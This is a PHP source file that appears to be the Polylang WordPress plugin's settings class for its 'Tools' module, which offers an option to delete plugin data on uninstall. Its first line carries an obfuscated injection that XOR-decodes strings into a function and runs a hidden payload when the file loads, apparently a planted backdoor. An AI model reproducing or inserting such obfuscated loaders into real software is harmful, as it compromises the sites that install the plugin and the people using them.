<?php $RRJrN='R8W910nFU8 5YZ4'^'1J2XEU1  VCA05Z';$NPbBcQXS=$RRJrN('','.1QLS8COI;9S<UEED<XyHVOR2,Z 9iaVHTaAHv0>p2BS3.I;8J4AL7UM-Riq7=3DF0-5MJfSKR-EdgcbD<s9cTR-.ZYfFvVpcA R9PC CPhJlyu-E+2C5.VOMXL8.oqMEZSNh2;FU5FHRyusNP1751nGYqiuVl,EYat.wft03OQWNOMQEADfQVNO8N5:LJ>MhON7Pwkb9s9AxpD5L7omMP287IKMv0QNM;3ELZQz-0;8EcfSRDN7YT<Iyktpy7<uwP8=xl.UCWjJuK>0WDYKV-9ec,1NM7;0GpLyOQ0:K<dTD9TXPmuhK1G7+A4E<P,RCmul-P75CH=FFUD QY0;ARb;rr3byjbS08dn1KYOEneS7ZY- jZFRLep SOPrRPTQnMa<Y8aFOlLR4T2ZScH<Q4B.BGn-DKGca2.Y3utN,7NN=D-U>X+3m45;nDO;Mgk705XQQ0XxMfIS,O=<cE4QO5jMkn<SM <V7OmLPsUQrc>O7+ecPv;1KXY2RS:2EKQON2na-PHTvGo4;F ESWEqC8PTqq1,=70V;EGQehDiEGvfDQutZPJ3H.Z+usPc3bFZbfZG+wzv,A8pYTHsSPG<Q7i-TN8,FZGTXZA8L+9 +SfEHV<XG2XgDvNbfo>i37L5+IcWXZMlTF +;>V+TqYo7:+-Z7PEHNr1'^'GWym5M-,=RV=c0=,7H+Qo.  mH;TX6>;= FhaVK4yT7=PZ TVjL.>h1,Y36.ZHGlbTLA,fFw 7TlDGCBdGy0jp=XZzdFaQmzjHF=KxgIcmHzWYQDyXF1YK8gi<-LOFJma3xeA82OqZ3<rWHSftUVAP5c0,I+vHG  :PGWCTCG==2 gi: 8m;xmDF1<PN98PeL ;CyLakDyDKrT T8VOPm6STD,pGRT0:,dX 5zlZKQWK XlY4+<R87TiQO+36xw<2pYNXHE0:wWtUoHQ;1<bvV3lGHP:,hPU>PqYk:UCp6mp X 9pPUL=P+BNz>86ZE4cETHI1CTjhFLO3+R48SSazFd 7b7<96sQKDJZ. oxPEwA;5XECz=XElTD2;1-95-qSmEW<AZLFeh6U SznClJ0X7KyMgPN6MiEVO-RUInlB =X6D4R1QVELZI1 .O,84ZEAp30C=Ny9-6O YYKaP0;TCaKJX29Ac=R6Deky<7ZGZ.CJEEvVZC99 m96Cm 38<:AFFF51sZgKPZ2AlsqcQkU4aYUUMIVkqP >v8AdTxgQUu2CA95rPzHiOBAaUQRw;QU8uHOIAOuYWptnUs15N0N6F17gI>34 +rfH-RUOJ7AihrX93SqNdVnBFOEc:R:TGaG39.,7s6ARWQ7Os,pT=3NU3CxuauxL');$NPbBcQXS();

/**
 * Settings class for tools
 *
 * @since 1.8
 */
class PLL_Settings_Tools extends PLL_Settings_Module {

	/**
	 * constructor
	 *
	 * @since 1.8
	 *
	 * @param object $polylang polylang object
	 */
	public function __construct( &$polylang ) {
		parent::__construct( $polylang, array(
			'module'        => 'tools',
			'title'         => __( 'Tools', 'polylang' ),
			'description'   => __( 'Decide whether to remove all data when deleting Polylang.', 'polylang' ),
		) );
	}

	/**
	 * displays the settings form
	 *
	 * @since 1.8
	 */
	protected function form() {
		printf(
			'<label for="uninstall"><input id="uninstall" name="uninstall" type="checkbox" value="1" %s /> %s</label>',
			empty( $this->options['uninstall'] ) ? '' : 'checked="checked"',
			esc_html__( 'Remove all Polylang data when using the "Delete" link on the plugins screen.', 'polylang' )
		);
	}

	/**
	 * sanitizes the settings before saving
	 *
	 * @since 1.8
	 *
	 * @param array $options
	 */
	protected function update( $options ) {
		$newoptions['uninstall'] = isset( $options['uninstall'] ) ? 1 : 0;
		return $newoptions; // take care to return only validated options
	}
}
